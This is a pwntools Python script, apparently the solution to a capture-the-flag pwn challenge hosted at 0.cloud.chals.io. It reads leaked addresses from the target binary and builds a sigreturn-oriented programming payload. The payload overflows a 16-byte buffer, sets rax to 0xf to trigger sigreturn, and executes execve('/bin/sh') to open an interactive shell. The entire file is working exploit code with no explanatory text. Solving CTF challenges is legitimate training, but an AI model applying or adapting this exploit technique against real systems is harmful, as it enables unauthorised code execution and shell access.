from pwn import *

binary = args.BIN

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
e = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.attach(e.path)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 21978)
    else:
        return process(e.path)

p = start()

buffer = b'a'*16

p.recvuntil(b' : ')
bin_sh  = int(p.recvline(), 16)

p.sendline(b'>>> ')
p.sendline(b'Y')
p.recvuntil(b' | ')
pop_rax = int(p.recvline(), 16) + 6

p.sendline(b'>>>')
p.sendline(b'Y')
p.recvuntil(b' | ')
syscall = int(p.recvline(), 16) + 4

log.success(f"/bin/sh : {hex(bin_sh)}")
log.success(f"pop rax; ret : {hex(pop_rax)}")
log.success(f"syscall; ret : {hex(syscall)}")

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload = buffer
payload += p64(pop_rax)
payload += p64(0xf)
payload += p64(syscall)
payload += bytes(frame)

p.sendline(payload)

p.interactive()

